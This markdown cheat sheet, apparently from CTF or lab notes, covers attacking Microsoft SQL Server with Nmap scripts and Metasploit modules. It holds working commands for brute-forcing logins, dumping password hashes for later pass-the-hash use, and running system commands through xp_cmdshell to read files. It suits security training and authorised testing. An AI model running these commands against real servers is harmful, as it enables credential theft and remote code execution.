# Enumeration: MSSQL
> MSSQL is Microsoft's version of an SQL database.

- Default MSSQL Port: `1433`

## Contents
- [Nmap Scripts](#nmap-scripts)
  - [ms-sql-info](#ms-sql-info)
  - [ms-sql-ntlm-info](#ms-sql-ntlm-info)
  - [ms-sql-brute](#ms-sql-brute)
  - [ms-sql-empty-password](#ms-sql-empty-password)
  - [ms-sql-query](#ms-sql-query)
  - [ms-sql-dump-hashes](#ms-sql-dump-hashes)
  - [ms-sql-xp-cmdshell](#ms-sql-xp-cmdshell)
- [MetaSploit](#metasploit)

## Nmap Scripts

### ms-sql-info
> This gives you a little more info than a standard nmap version scan (e.g., patches applied: true|false).
```
nmap -p 1433 --script ms-sql-info [target ip]
```

### ms-sql-ntlm-info
> This gives us the Target_Name and other similar info
```
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [target ip]
```

### ms-sql-brute
> This gives us some login creds (usernames/pwds)
```
nmap [target ip] -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
```

### ms-sql-empty-password
> Check for usernames with no password
```
nmap [target ip] -p 1433 --script ms-sql-empty-password
```

### ms-sql-query
```
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" [target ip] -oN output.txt
```
- Note: The query statement is the example given in the Nmap [NSE documentation](https://nmap.org/nsedoc/scripts/ms-sql-query.html).
  - You could try [syslogins](https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-syslogins-transact-sql?view=sql-server-ver16) or [sysusers](https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysusers-transact-sql?view=sql-server-ver16) or etc.
- Run a query using some of the info we've found so far.
- The output is a db dump, so it looks like a mess on your screen. That's why we did the -oN  (output Normal) to a text file.
- Open that text file in a text editor with monospace font
- Lots of goodies there about system and user logins. Enumerate. 

### ms-sql-dump-hashes
> This is good info to enumerate (maybe "pass the hash" later on)
```
nmap [target ip] -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
```

### ms-sql-xp-cmdshell
> Try to run some actual code on the target machine via their mssql instance. If you get a response to the command, you know you can execute code on the remote system.
```
nmap [target ip] -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
```
> Read a file on the remote system
```
nmap [target ip] -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```

## MetaSploit

Modules to Enumerate MSSQL:
- `mssql_enum` : enumerate MSSQL configuration
- `mssql_enum_sql_logins` : enumerate all MSSQL logins
- `mssql_login` : discover valid users and their passwords
- `mssql_exec` : execute a command on the target machine
- `mssql_enum_domain_accounts` : enumerate all available system users

